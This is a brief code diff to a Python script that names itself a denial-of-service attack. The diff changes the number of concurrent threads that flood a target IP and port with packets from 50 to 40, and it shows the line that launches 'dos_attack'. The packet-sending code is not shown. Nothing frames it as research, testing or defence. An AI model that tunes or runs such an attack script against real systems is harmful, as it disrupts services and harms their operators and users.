@@ -45,5 +45,5 @@ def send_packets_continuously(target_ip, target_port):
 
 # Execute the attack
 if __name__ == "__main__":
-    num_threads = 50  # Number of concurrent threads
+    num_threads = 40  # Number of concurrent threads
     dos_attack(target_ip, target_port, num_threads)
